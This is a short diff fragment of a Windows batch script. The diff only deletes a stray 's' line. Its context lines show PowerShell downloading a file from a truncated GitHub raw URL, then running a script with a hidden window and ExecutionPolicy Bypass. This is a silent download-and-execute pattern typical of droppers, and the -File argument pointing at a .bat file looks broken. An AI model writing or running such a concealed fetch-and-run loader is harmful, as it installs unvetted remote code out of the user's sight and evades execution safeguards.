@@ -12,4 +12,3 @@ powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.github
 
 :: Run the PowerShell script silently
 powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "%~dp0run.bat"
-s
